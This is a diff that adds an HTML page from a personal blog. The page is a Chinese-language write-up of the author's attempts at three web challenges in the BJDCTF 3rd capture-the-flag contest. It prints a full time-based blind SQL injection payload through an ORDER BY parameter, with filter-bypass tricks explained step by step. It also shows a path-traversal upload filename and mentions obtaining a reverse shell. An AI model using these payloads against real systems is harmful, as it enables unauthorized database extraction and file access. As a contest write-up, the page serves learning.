@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>BJDCTF 3rd-小知识点 | AFKL&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="今天也是被题目暴打的一回呢（，只出来两道题，有大量的时间浪费在了多人运动的注入上...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF 3rd-小知识点">
+<meta property="og:url" content="http://yoursite.com/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+<meta property="og:site_name" content="AFKL&#39;s Blog">
+<meta property="og:description" content="今天也是被题目暴打的一回呢（，只出来两道题，有大量的时间浪费在了多人运动的注入上...">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-05-23T17:06:00.000Z">
+<meta property="article:modified_time" content="2020-06-26T15:54:17.320Z">
+<meta property="article:author" content="AFKL">
+<meta property="article:tag" content="Blog">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="AFKL&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">AFKL&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-BJDCTF-3rd-小知识点" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/" class="article-date">
+  <time datetime="2020-05-23T17:06:00.000Z" itemprop="datePublished">2020-05-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      BJDCTF 3rd-小知识点
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>今天也是被题目暴打的一回呢（，只出来两道题，有大量的时间浪费在了多人运动的注入上…</p>
+<h1 id="小红花"><a href="#小红花" class="headerlink" title="小红花"></a>小红花</h1><p>很简单，因为shell_exec不会输出返回值（准确来说会返回一个字符串，但不会直接打印在浏览器上）。所以直接尝试反弹shell。这里用php反弹shell成功。<br>后来听说有防火墙ban了一些端口，运气好直接找到了没ban的（（（</p>
+<h1 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h1><p>在上传完文件后会设置一个phpsessid，再访问show.php会出现刚才上传的图片(data://base64的形式)。base64_decode(phpsessid)后发现里面含有上传文件的路径。故尝试上传一个<code>../../../../flag</code>(有多少个../我忘了)的文件。实现目录穿梭，得到flag。<br>PS：我最开始是以为要去解析那个phpsessid，尝试对其进行修改…结果完全不知道后面的hash值是怎么来的，最后发现做麻烦了</p>
+<h1 id="多人运动"><a href="#多人运动" class="headerlink" title="多人运动"></a>多人运动</h1><p>做了很长时间也没有做出来…看到那个hint以为是表名有东西…<br>首先是如何进行注入,可以看到服务器读取的数据会根据by参数进行排序，猜测是order by注入，首先排除联合注入<br>以下是我的payload：</p>
+<pre><code>http://x.x.x.x:xxxxx/?by=desc,(SELECT (CASE WHEN (select left((select group_concat(database_name) from mysql.innodb_table_stats),11)in(concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115)))) THEN BENCHMARK(999999999,md5(1)) ELSE 1 END))
+
+详解：
+$payload = desc,(SELECT (CASE WHEN $a THEN $b ELSE 1 END))
+题目过滤了if，故使用case进行绕过
+
+$a = (select ($a_1)in($a_2))
+因为题目过滤了 =&lt;&gt;like 所以使用in来替代
+
+$a_1 = left($a_1_1,11)
+题目过滤了大多数字符串切割函数，可以使用left和right来绕过
+PS:看出题人同时使用left和right来达到提取单个字符的作用，这一点我没想到...如:right(left(xxx,3),2)
+
+$a_1_1 = (select group_concat(database_name) from mysql.innodb_table_stats)
+这里因为过滤了or和sys，没法提取表名，故尝试用mysql.innodb_table_stats来绕过，但这形成了一个大坑
+
+$a_2 = concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115))
+这里因为单使用left提取出来的是字符串不是单个字符，而char函数没有ban，故使用上面的方式组合字符串
+PS：除了char以外还有unhex; conv;函数可以用，不过char更简单一些
+
+$b = BENCHMARK(999999999,md5(1))
+题目过滤了sleep，使用BENCHMARK多次执行一个操作</code></pre><p>然而这道题最终没能解出来的原因是使用了mysql.innodb_table_stats这个坑<br>诚然，innodb在默认情况下是关闭的，但不代表它不作用。<br>在其关闭的情况下使用mysql.innodb_table_stats查询，不会为空，而是能查出来mysql默认的两个库mysql和sys，其它库不能查到，表名同理。<br>而我以为…如果关闭了innodb，整个innodb_table_stats是空，没有数据的（<br>最终导致我这道题没有做出来…</p>
+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>因为花费了大量的时间在多人运动这道题上，其它的题没有看，待复现环境出来再说吧…<br>PS：我菜炸了（</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="ckbweck8h00008892eaa5byrb" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/06/17/dozerCTF-Fake-phpminiadmin/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          dozerCTF - Fake phpminiadmin
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">网鼎杯2020-小知识点</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/06/17/dozerCTF-Fake-phpminiadmin/">dozerCTF - Fake phpminiadmin</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">BJDCTF 3rd-小知识点</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">网鼎杯2020-小知识点</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/21/HFCTF2020-uploadBaby/">HFCTF2020-uploadBaby</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">C语言实现学生信息管理系统</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 AFKL<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
